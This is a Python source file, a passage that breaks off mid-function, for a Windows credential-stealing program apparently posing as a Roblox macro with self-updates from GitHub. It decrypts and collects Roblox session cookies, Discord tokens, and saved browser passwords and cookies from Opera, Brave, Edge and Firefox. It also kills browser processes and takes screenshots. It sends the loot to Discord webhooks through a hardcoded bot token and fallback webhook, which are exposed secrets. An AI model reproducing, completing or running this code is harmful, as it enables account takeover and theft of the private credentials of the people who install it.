import os
import sys
import subprocess
import importlib.metadata

REQUIRED_PACKAGES = [
    'pywin32',
    'requests',
    'pyperclip',
    'keyboard',
    'mss',
    'pycryptodome',
    'pypsexec',
    'psutil'
]

def install_package(package):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', package])
        return True
    except:
        return False

def check_and_install_dependencies():
    missing_packages = []
    for package in REQUIRED_PACKAGES:
        try:
            if package == 'pywin32':
                import win32api
            elif package == 'pycryptodome':
                from Crypto.Cipher import AES
            else:
                importlib.metadata.version(package.replace('-', '_'))
        except (ImportError, importlib.metadata.PackageNotFoundError):
            missing_packages.append(package)
    if missing_packages:
        print(f"Installation des dépendances manquantes : {missing_packages}")
        for package in missing_packages:
            if not install_package(package):
                print(f"Échec de l'installation de {package}")
                return False
        print("Redémarrage du script...")
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)
    return True

if not check_and_install_dependencies():
    sys.exit(1)

import shutil
import json
import base64
import time
import re
import threading
from datetime import datetime, timedelta, timezone
import urllib.request
import urllib.parse
import win32crypt
import requests
import pyperclip
import keyboard
import win32gui
from Crypto.Cipher import AES
import mss
import mss.tools
import ctypes
import tempfile
import sqlite3
import binascii
import configparser
import psutil
from pypsexec.client import Client

# ========== CONSTANTES ==========
BOT_TOKEN = "MTQwOTUyNDg4MTQ4MTI3MzQyNQ.GAqlvk.UgUq_jUdTUIScKBmu_odcb4Bp21YebBiIvXmaw"
GUILD_ID = 1418647151554068672
CATEGORY_ID = 1497202726105514045
FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1497307123674251276/Mkxk3zsvnRjsZwkUD2x5cKyt344517wW1htS3pKWpc59zO_kIDJfHF6f5wF8wBoF8v8I"
TARGET_WINDOWS = ["roblox", "fishtrap", "bloxtrap", "voidtrap"]
VERSION_URL = "https://raw.githubusercontent.com/Paladu13/macro/main/version"
UPDATE_URL = "https://raw.githubusercontent.com/Paladu13/macro/main/service_update.pyw"
CONFIG_FILE = "config.txt"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
}

BROWSER_PROCESS_NAMES = {
    'opera':    ['opera.exe'],
    'operagx':  ['opera.exe', 'operagx.exe'],
    'brave':    ['brave.exe'],
    'edge':     ['msedge.exe'],
    'firefox':  ['firefox.exe']
}

webhook_cache = {"_timestamps": {}}
last_action_time = 0
MIN_ACTION_INTERVAL = 5.0
first_cookie_sent = False
last_sent_cookie = None

pending_digits = ""
last_digit_time = 0
timer_active = False
keylogger_lock = threading.Lock()

config_lock = threading.RLock()

IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0

# ========== FONCTIONS UTILITAIRES ==========
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    with open(path + "\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def can_perform_action(is_first_cookie=False):
    global last_action_time
    if is_first_cookie:
        last_action_time = time.time()
        return True
    now = time.time()
    if now - last_action_time < MIN_ACTION_INTERVAL:
        return False
    last_action_time = now
    return True

# ========== GESTION DU FICHIER DE CONFIGURATION ==========
def load_config():
    with config_lock:
        if not os.path.exists(CONFIG_FILE):
            return {}
        try:
            mapping = {}
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and not any(line.startswith(k) for k in ["version=", "last_notified_version=", "category_id=", "pc_salon_webhook=", "pc_salon_name="]):
                        user, wh = line.split(":", 1)
                        mapping[user.strip()] = wh.strip()
            return mapping
        except:
            return {}

def get_config_value(key):
    with config_lock:
        if not os.path.exists(CONFIG_FILE):
            return None
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    if line.startswith(f"{key}="):
                        return line.split("=", 1)[1].strip()
        except:
            pass
        return None

def set_config_value(key, value):
    with config_lock:
        lines = []
        found = False
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                for i in range(len(lines)):
                    if lines[i].startswith(f"{key}="):
                        lines[i] = f"{key}={value}\n"
                        found = True
                        break
            except:
                lines = []
        if not found:
            lines.append(f"{key}={value}\n")
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                f.writelines(lines)
        except:
            pass

def save_user_webhook(username, webhook_url):
    with config_lock:
        mapping = {}
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if ":" in line and not any(line.startswith(k) for k in ["version=", "last_notified_version=", "category_id=", "pc_salon_webhook=", "pc_salon_name="]):
                            user, wh = line.split(":", 1)
                            mapping[user.strip()] = wh.strip()
            except:
                pass
        mapping[username] = webhook_url
        lines = []
        for u, w in mapping.items():
            lines.append(f"{u}:{w}\n")
        local_ver = get_config_value("version")
        if local_ver:
            lines.append(f"version={local_ver}\n")
        last_notified = get_config_value("last_notified_version")
        if last_notified:
            lines.append(f"last_notified_version={last_notified}\n")
        category_id = get_config_value("category_id")
        if category_id:
            lines.append(f"category_id={category_id}\n")
        pc_wh = get_config_value("pc_salon_webhook")
        if pc_wh:
            lines.append(f"pc_salon_webhook={pc_wh}\n")
        pc_name = get_config_value("pc_salon_name")
        if pc_name:
            lines.append(f"pc_salon_name={pc_name}\n")
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                f.writelines(lines)
        except:
            pass

def remove_user_from_config(username):
    with config_lock:
        mapping = {}
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if ":" in line and not any(line.startswith(k) for k in ["version=", "last_notified_version=", "category_id=", "pc_salon_webhook=", "pc_salon_name="]):
                            user, wh = line.split(":", 1)
                            mapping[user.strip()] = wh.strip()
            except:
                pass
        if username in mapping:
            del mapping[username]
        lines = [f"{u}:{w}\n" for u, w in mapping.items()]
        local_ver = get_config_value("version")
        if local_ver:
            lines.append(f"version={local_ver}\n")
        last_notified = get_config_value("last_notified_version")
        if last_notified:
            lines.append(f"last_notified_version={last_notified}\n")
        category_id = get_config_value("category_id")
        if category_id:
            lines.append(f"category_id={category_id}\n")
        pc_wh = get_config_value("pc_salon_webhook")
        if pc_wh:
            lines.append(f"pc_salon_webhook={pc_wh}\n")
        pc_name = get_config_value("pc_salon_name")
        if pc_name:
            lines.append(f"pc_salon_name={pc_name}\n")
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                f.writelines(lines)
        except:
            pass

# ========== VALIDATION UTILISATEUR ROBLOX ==========
def is_roblox_user_valid(username):
    try:
        r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={username}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            for user in data.get("data", []):
                if user["name"].lower() == username.lower():
                    return True
        return False
    except:
        return False

def cleanup_invalid_users():
    mapping = load_config()
    modified = False
    for username in list(mapping.keys()):
        if not is_roblox_user_valid(username):
            remove_user_from_config(username)
            modified = True
    return modified

# ========== CAPTURE D'ÉCRAN ==========
def capture_screenshot(monitor_number=None):
    screenshots = []
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            if monitor_number is not None:
                monitors_to_capture = [monitors[monitor_number]]
            else:
                monitors_to_capture = [monitors[i] for i in range(1, len(monitors))]
            for i, monitor in enumerate(monitors_to_capture):
                screenshot = sct.grab(monitor)
                screenshot_path = os.path.join(os.getenv("TEMP"), f"screenshot_{datetime.now():%Y%m%d_%H%M%S}_monitor{i+1}.png")
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
                with open(screenshot_path, "rb") as f:
                    screenshot_data = base64.b64encode(f.read()).decode()
                os.remove(screenshot_path)
                screenshots.append({
                    'data': screenshot_data,
                    'width': monitor['width'],
                    'height': monitor['height'],
                    'left': monitor.get('left', 0),
                    'top': monitor.get('top', 0)
                })
    except Exception:
        pass
    return screenshots

# ========== GESTION DES WEBHOOKS ==========
def send_error_to_fallback(error_msg, component="Général"):
    pc_name = os.getenv('COMPUTERNAME', 'Inconnu')
    roblox_user = "Aucun"
    try:
        mapping = load_config()
        if mapping:
            roblox_user = list(mapping.keys())[0]
    except:
        pass
    detail = str(error_msg)
    if len(detail) > 1000:
        detail = detail[:990] + "\n... (tronqué)"
    embed = {
        "title": "⚠️ Erreur remontée",
        "color": 0xFF0000,
        "fields": [
            {"name": "💻 PC", "value": f"`{pc_name}`", "inline": True},
            {"name": "👤 Utilisateur Roblox", "value": f"`{roblox_user}`", "inline": True},
            {"name": "🧩 Composant", "value": f"`{component}`", "inline": True},
            {"name": "📄 Détails", "value": f"```\n{detail}\n```", "inline": False}
        ],
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    payload = {
        "embeds": [embed],
        "username": "Error Reporter"
    }
    try:
        requests.post(FALLBACK_WEBHOOK, json=payload, headers={"Content-Type": "application/json"}, timeout=5)
    except:
        pass

def send_to_discord(webhook_url, payload, files=None):
    if not webhook_url:
        return
    try:
        if files:
            requests.post(webhook_url, files=files, timeout=15)
        else:
            requests.post(webhook_url, json=payload, headers={"Content-Type": "application/json"}, timeout=6)
    except Exception as e:
        send_error_to_fallback(str(e), component=f"Envoi vers {webhook_url[:60]}")

def create_webhook_from_scratch(username):
    if not username:
        return None
    if not is_roblox_user_valid(username):
        remove_user_from_config(username)
        return None
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        target_name = username.lower().replace(" ", "-")[:100]
        ch_resp = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, timeout=8)
        if ch_resp.status_code != 200:
            return None
        channel_id = None
        for ch in ch_resp.json():
            if ch.get("type") == 0 and ch.get("name") == target_name:
                channel_id = ch["id"]
                break
        if channel_id:
            wh_resp = requests.get(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, timeout=8)
            if wh_resp.status_code == 200:
                for wh in wh_resp.json():
                    if wh.get("name") == f"TrapLogger - {username}":
                        requests.delete(f"https://discord.com/api/v10/webhooks/{wh['id']}/{wh['token']}", headers=headers, timeout=5)
        if not channel_id:
            ch_payload = {
                "name": target_name,
                "type": 0,
                "permission_overwrites": [{"id": str(GUILD_ID), "type": 0, "deny": 1024}]
            }
            create_ch = requests.post(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, json=ch_payload, timeout=10)
            if create_ch.status_code not in (200, 201):
                return None
            channel_id = create_ch.json()["id"]
        wh_payload = {"name": f"TrapLogger - {username}", "avatar": "https://i.imgur.com/4M34hi2.png"}
        wh_resp = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=wh_payload, timeout=8)
        if wh_resp.status_code not in (200, 201):
            return None
        data = wh_resp.json()
        url = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
        save_user_webhook(username, url)
        return url
    except Exception:
        return None

def get_or_create_webhook_for_username(username, force_refresh=False):
    if not username:
        return None
    if not force_refresh and username in webhook_cache:
        cached_url = webhook_cache.get(username)
        if cached_url and cached_url.startswith("https://discord.com/api/webhooks/"):
            return cached_url
    mapping = load_config()
    if username in mapping:
        config_url = mapping[username]
        if config_url and config_url.startswith("https://discord.com/api/webhooks/"):
            if force_refresh:
                valid = verify_and_fix_webhook(username, config_url, force_check=True)
                if valid:
                    webhook_cache[username] = valid
                    return valid
            else:
                webhook_cache[username] = config_url
                return config_url
    new_webhook = create_webhook_from_scratch(username)
    if new_webhook:
        webhook_cache[username] = new_webhook
        return new_webhook
    return None

def get_or_create_pc_webhook():
    pc_name = os.getenv('COMPUTERNAME', 'PC').lower().strip()
    existing_wh = get_config_value("pc_salon_webhook")
    if existing_wh:
        try:
            match = re.search(r'webhooks/(\d+)/([a-zA-Z0-9_-]+)', existing_wh)
            if match:
                check_url = f"https://discord.com/api/v10/webhooks/{match.group(1)}/{match.group(2)}"
                resp = requests.get(check_url, timeout=8)
                if resp.status_code == 200:
                    return existing_wh
        except:
            pass

    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        channels_resp = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, timeout=8)
        if channels_resp.status_code != 200:
            return None
        channel_id = None
        for ch in channels_resp.json():
            if ch.get("type") == 0 and ch.get("parent_id") == str(CATEGORY_ID) and ch.get("name", "").lower() == pc_name:
                channel_id = ch["id"]
                break
        if not channel_id:
            create_payload = {
                "name": pc_name,
                "type": 0,
                "parent_id": str(CATEGORY_ID),
                "permission_overwrites": [{"id": str(GUILD_ID), "type": 0, "deny": 1024}]
            }
            create_ch = requests.post(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, json=create_payload, timeout=10)
            if create_ch.status_code not in (200, 201):
                return None
            channel_id = create_ch.json()["id"]
        webhooks_resp = requests.get(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, timeout=8)
        webhook_url = None
        if webhooks_resp.status_code == 200:
            for wh in webhooks_resp.json():
                if wh.get("name") == f"TrapLogger-{pc_name}":
                    webhook_url = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                    break
        if not webhook_url:
            wh_payload = {"name": f"TrapLogger-{pc_name}", "avatar": "https://i.imgur.com/4M34hi2.png"}
            wh_created = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=wh_payload, timeout=8)
            if wh_created.status_code in (200, 201):
                data = wh_created.json()
                webhook_url = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
        if webhook_url:
            set_config_value("pc_salon_webhook", webhook_url)
            set_config_value("pc_salon_name", pc_name)
            return webhook_url
    except Exception:
        pass
    return None

def verify_and_fix_webhook(username, webhook_url, force_check=False):
    if not webhook_url or not webhook_url.startswith("https://discord.com/api/webhooks/"):
        return None
    cache_key = f"verify_{username}"
    last_check = webhook_cache.get(cache_key, 0)
    current_time = time.time()
    if not force_check and current_time - last_check < 600:
        return webhook_cache.get(username, webhook_url)
    try:
        match = re.search(r'webhooks/(\d+)/([a-zA-Z0-9_-]+)', webhook_url)
        if not match:
            return None
        webhook_id = match.group(1)
        webhook_token = match.group(2)
        check_url = f"https://discord.com/api/v10/webhooks/{webhook_id}/{webhook_token}"
        response = requests.get(check_url, timeout=8)
        webhook_cache[cache_key] = current_time
        if response.status_code == 200:
            webhook_cache[username] = webhook_url
            return webhook_url
        if response.status_code in (404, 403, 401):
            new_webhook = create_webhook_from_scratch(username)
            if new_webhook:
                webhook_cache[username] = new_webhook
                webhook_cache.pop(cache_key, None)
                save_user_webhook(username, new_webhook)
                return new_webhook
        return None
    except Exception:
        return webhook_url

def validate_and_fix_all_webhooks():
    mapping = load_config()
    if not mapping:
        return mapping
    modified = False
    for username, webhook_url in mapping.items():
        valid_webhook = verify_and_fix_webhook(username, webhook_url, force_check=False)
        if valid_webhook != webhook_url:
            modified = True
    if modified:
        cleanup_invalid_users()
    return load_config()

# ========== GESTION DES COOKIES ROBLOX ==========
def get_roblox_username_from_cookie(cookie_value):
    if not cookie_value.startswith('_|WARNING:'):
        return None
    try:
        session = requests.Session()
        session.headers.update({
            "Cookie": f".ROBLOSECURITY={cookie_value}",
            "User-Agent": "Roblox/WinInet",
            "Accept": "application/json",
            "Referer": "https://www.roblox.com/"
        })
        r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
        if r.status_code == 200:
            return r.json().get("name")
        if r.status_code in (401, 403):
            csrf_resp = session.post("https://auth.roblox.com/v2/logout", timeout=6)
            csrf = csrf_resp.headers.get("x-csrf-token")
            if csrf:
                session.headers["x-csrf-token"] = csrf
                r2 = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
                if r2.status_code == 200:
                    return r2.json().get("name")
        return None
    except:
        return None

def send_roblox_cookie_to_webhook(cookie_data, username=None):
    global first_cookie_sent, last_sent_cookie
    if cookie_data == last_sent_cookie and not first_cookie_sent:
        return
    last_sent_cookie = cookie_data
    try:
        pyperclip.copy(cookie_data)
        pyperclip.copy("")
        payload = {
            "content": f"**Roblox Cookie Captured**\n```\n{cookie_data}\n```",
            "username": "Roblox Cookie Grabber",
            "avatar_url": "https://i.imgur.com/4M34hi2.png"
        }
        target = None
        if username:
            target = get_or_create_webhook_for_username(username, force_refresh=True)
        if not target:
            cookie_username = get_roblox_username_from_cookie(cookie_data)
            if cookie_username:
                target = get_or_create_webhook_for_username(cookie_username, force_refresh=True)
        if target:
            send_to_discord(target, payload)
        else:
            pass
        first_cookie_sent = True
    except Exception:
        pass

def retrieve_roblox_cookies(force_send=False):
    if not force_send and not can_perform_action(is_first_cookie=not first_cookie_sent):
        return
    try:
        profile = os.getenv("USERPROFILE")
        if not profile:
            return
        path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
        if not os.path.exists(path):
            return
        temp_dir = os.getenv("TEMP") or os.path.expanduser("~\\AppData\\Local\\Temp")
        temp_file = f"rc_{datetime.now():%Y%m%d_%H%M%S}.dat"
        dest = os.path.join(temp_dir, temp_file)
        shutil.copy(path, dest)
        data = None
        try:
            with open(dest, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            pass
        finally:
            if os.path.exists(dest):
                try:
                    os.remove(dest)
                except:
                    pass
        if not data or "CookiesData" not in data:
            return
        encoded = data["CookiesData"]
        decoded = base64.b64decode(encoded)
        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
        cookies_str = decrypted.decode('utf-8', errors='ignore')
        for line in cookies_str.split(';'):
            line = line.strip()
            if '.ROBLOSECURITY' in line:
                cookie_value = line.split('=', 1)[1].strip() if '=' in line else line.split('.ROBLOSECURITY')[-1].strip()
                if any(x in cookie_value[:80] for x in ['#HttpOnly_', 'TRUE', 'FALSE', '\t']):
                    parts = cookie_value.split()
                    cookie_value = parts[-1] if parts else cookie_value
                if not cookie_value.startswith('_|WARNING:'):
                    continue
                username = get_roblox_username_from_cookie(cookie_value)
                send_roblox_cookie_to_webhook(cookie_value, username)
                return
    except:
        pass

# ========== EXTRACTION NAVIGATEURS ==========
def kill_browser_process(browser_key):
    if browser_key not in BROWSER_PROCESS_NAMES:
        return
    names_to_kill = BROWSER_PROCESS_NAMES[browser_key]
    killed = False
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in names_to_kill:
                proc.terminate()
                killed = True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    if killed:
        time.sleep(2.0)
    if IS_ADMIN:
        for name in names_to_kill:
            try:
                subprocess.call(f"taskkill /f /im {name} /t", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

def chrome_date_to_str(d):
    if d <= 0:
        return "Session"
    return (datetime(1601, 1, 1) + timedelta(microseconds=d)).strftime("%Y-%m-%d %H:%M:%S")

def get_browser_encryption_key(base_path):
    local_state = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(enc_value, key):
    if not key:
        return None
    try:
        if enc_value[:3] in (b'v10', b'v11', b'v20'):
            cipher = AES.new(key, AES.MODE_GCM, nonce=enc_value[3:15])
            decrypted = cipher.decrypt_and_verify(enc_value[15:-16], enc_value[-16:])
            if len(decrypted) > 32:
                return decrypted[32:].decode(errors="ignore")
            else:
                return decrypted.decode(errors="ignore")
        else:
            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode(errors="ignore")
    except:
        return None

def extract_opera_data(browser_name, base_path):
    result = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
    if not os.path.exists(base_path):
        result['errors'].append(f"{browser_name}: dossier introuvable")
        return result
    key = get_browser_encryption_key(base_path)
    if not key:
        result['errors'].append(f"{browser_name}: clé de chiffrement introuvable")
        return result

    profiles = []
    default_path = os.path.join(base_path, "Default")
    if os.path.exists(os.path.join(default_path, "Login Data")):
        profiles.append(("Default", default_path))
    for item in os.listdir(base_path):
        if item.startswith("Profile "):
            profile_path = os.path.join(base_path, item)
            if os.path.exists(os.path.join(profile_path, "Login Data")):
                profiles.append((item, profile_path))

    all_passwords = []
    all_cookies = []

    for profile_name, profile_path in profiles:
        # Mots de passe
        try:
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if user or pwd:
                        password = decrypt_value(pwd, key) if pwd else ""
                        if user or (password and password != "[Erreur]"):
                            all_passwords.append((profile_name, url, user, password))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"{browser_name}/{profile_name} passwords: {e}")

        # Cookies
        try:
            cookie_path = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_path):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_path, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for host, name, path, enc_val, expires, secure, httponly in conn.execute(
                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"
                ):
                    val = decrypt_value(enc_val, key)
                    if val:
                        if expires and datetime(1601, 1, 1) + timedelta(microseconds=expires) <= datetime.now():
                            continue
                        all_cookies.append((profile_name, host, name, path, val, chrome_date_to_str(expires), bool(secure), bool(httponly)))
                conn.close()
                os.unlink(tmp.name)
        except Exception as e:
            result['errors'].append(f"{browser_name}/{profile_name} cookies: {e}")

    if all_passwords:
        pwd_file = os.path.join(tempfile.gettempdir(), f"{browser_name.lower().replace(' ', '_')}_passwords.txt")
        with open(pwd_file, "w", encoding="utf-8") as f:
            f.write(f"=== {browser_name} PASSWORDS ===\nDate: {datetime.now()}\nTotal: {len(all_passwords)}\n{'='*60}\n\n")
            for p in all_passwords:
                f.write(f"[Profil: {p[0]}]\nURL: {p[1]}\nLogin: {p[2]}\nPassword: {p[3]}\n{'-'*40}\n")
        result['passwords_file'] = pwd_file
        result['passwords_count'] = len(all_passwords)

    if all_cookies:
        cookie_file = os.path.join(tempfile.gettempdir(), f"{browser_name.lower().replace(' ', '_')}_cookies.txt")
        with open(cookie_file, "w", encoding="utf-8") as f:
            f.write(f"{browser_name} COOKIES - {datetime.now()} - Total: {len(all_cookies)}\n{'='*80}\n\n")
            current_profile = None
            for i, c in enumerate(all_cookies, 1):
                if current_profile != c[0]:
                    current_profile = c[0]
                    f.write(f"\n>>> PROFIL: {current_profile} <<<\n\n")
                f.write(f"[{i}] {c[1]}\n    Nom: {c[2]}\n    Valeur: {c[4]}\n    Path: {c[3]}\n    Expire: {c[5]}\n    Secure: {'✓' if c[6] else '✗'} | HttpOnly: {'✓' if c[7] else '✗'}\n{'-'*80}\n")
        result['cookies_file'] = cookie_file
        result['cookies_count'] = len(all_cookies)

    return result

# --- Firefox ---
class NSSProxy:
    class SECItem(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]
        def decode_data(self):
            return ctypes.string_at(self.data, self.len).decode('utf-8')

    class PK11SlotInfo(ctypes.Structure):
        pass

    def __init__(self):
        nssname = "nss3.dll"
        locations = ["", "C:\\Program Files\\Mozilla Firefox", "C:\\Program Files (x86)\\Mozilla Firefox"]
        for loc in locations:
            nsslib = os.path.join(loc, nssname)
            if not os.path.exists(nsslib):
                continue
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            workdir = os.getcwd()
            os.chdir(loc)
            try:
                self.libnss = ctypes.CDLL(nsslib)
                break
            finally:
                os.chdir(workdir)
        else:
            raise Exception("NSS library not found")

        SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
        SECItemPtr = ctypes.POINTER(self.SECItem)
        for name, restype, *argtypes in [
            ("NSS_Init", ctypes.c_int, ctypes.c_char_p),
            ("NSS_Shutdown", ctypes.c_int),
            ("PK11_GetInternalKeySlot", SlotInfoPtr),
            ("PK11_FreeSlot", None, SlotInfoPtr),
            ("PK11_NeedLogin", ctypes.c_int, SlotInfoPtr),
            ("PK11_CheckUserPassword", ctypes.c_int, SlotInfoPtr, ctypes.c_char_p),
            ("PK11SDR_Decrypt", ctypes.c_int, SECItemPtr, SECItemPtr, ctypes.c_void_p),
            ("SECITEM_ZfreeItem", None, SECItemPtr, ctypes.c_int)
        ]:
            res = getattr(self.libnss, name)
            res.argtypes = argtypes
            res.restype = restype
            setattr(self, "_" + name, res)

    def initialize(self, profile):
        self._NSS_Init(("sql:" + profile).encode('utf-8'))

    def shutdown(self):
        self._NSS_Shutdown()

    def authenticate(self, profile):
        keyslot = self._PK11_GetInternalKeySlot()
        try:
            if self._PK11_NeedLogin(keyslot):
                self._PK11_CheckUserPassword(keyslot, b"")
        finally:
            self._PK11_FreeSlot(keyslot)

    def decrypt(self, data64):
        data = binascii.a2b_base64(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        try:
            self._PK11SDR_Decrypt(inp, out, None)
            return out.decode_data()
        finally:
            self._SECITEM_ZfreeItem(out, 0)

def get_firefox_profiles(base_path=None):
    if base_path is None:
        base_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    profiles = []
    profileini = os.path.join(base_path, "profiles.ini")
    if not os.path.isfile(profileini):
        return []
    config = configparser.ConfigParser()
    config.read(profileini, encoding='utf-8')
    for section in config.sections():
        if section.startswith("Profile"):
            name = config.get(section, "Name", fallback="Unknown")
            path = config.get(section, "Path")
            full_path = os.path.join(base_path, path)
            if config.get(section, "IsRelative", fallback='1') == '0':
                full_path = path
            if os.path.exists(full_path):
                profiles.append((name, full_path))
    return profiles

def extract_firefox_data():
    result = {'cookies_file': None, 'passwords_file': None, 'cookies_count': 0, 'passwords_count': 0, 'errors': []}
    kill_browser_process('firefox')
    time.sleep(2.0)
    firefox_base = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    if not os.path.exists(firefox_base):
        result['errors'].append("Firefox: dossier introuvable")
        return result
    profiles = get_firefox_profiles(firefox_base)
    all_passwords = []
    all_cookies = []

    for profile_name, profile_path in profiles:
        # Mots de passe
        try:
            if not os.path.exists(os.path.join(profile_path, "key4.db")) or not os.path.exists(os.path.join(profile_path, "cert9.db")):
                continue
            moz = NSSProxy()
            moz.initialize(profile_path)
            moz.authenticate(profile_name)
            credentials = None
            logins_json = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_json):
                try:
                    with open(logins_json, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    credentials = [(entry["hostname"], entry["encryptedUsername"], entry["encryptedPassword"], entry.get("encType", 1))
                                   for entry in data.get("logins", [])]
                except:
                    pass
            if not credentials:
                signons_db = os.path.join(profile_path, "signons.sqlite")
                if os.path.exists(signons_db):
                    try:
                        tmp = tempfile.NamedTemporaryFile(delete=False)
                        tmp.close()
                        shutil.copy2(signons_db, tmp.name)
                        conn = sqlite3.connect(tmp.name)
                        cur = conn.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
                        credentials = cur.fetchall()
                        conn.close()
                        os.unlink(tmp.name)
                    except:
                        pass
            if credentials:
                for host, enc_user, enc_pwd, enc_type in credentials:
                    if enc_type:
                        try:
                            user = moz.decrypt(enc_user)
                            pwd = moz.decrypt(enc_pwd)
                            if user and pwd:
                                all_passwords.append((profile_name, host, user, pwd))
                        except:
                            pass
            moz.shutdown()
        except Exception as e:
            result['errors'].append(f"Firefox/{profile_name} passwords: {e}")

        # Cookies
        try:
            cookie_db = os.path.join(profile_path, "cookies.sqlite")
            if not os.path.exists(cookie_db):
                continue
            tmp = tempfile.NamedTemporaryFile(delete=False)
            tmp.close()
            shutil.copy2(cookie_db, tmp.name)
            conn = sqlite3.connect(tmp.name)
            cur = conn.cursor()
            cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite, originAttributes FROM moz_cookies")
            for row in cur.fetchall():
                host, name, value, path, expiry, secure, httponly, same_site, origin = row
                expiry_dt = None
                try:
                    expiry_dt = datetime.fromtimestamp(expiry) if expiry else None
                    if expiry_dt and expiry_dt <= datetime.now():
                        continue
                except:
                    expiry_dt = None
                if value:
                    all_cookies.append({
                        'host': host,
                        'name': name,
                        'value': value,
                        'path': path,
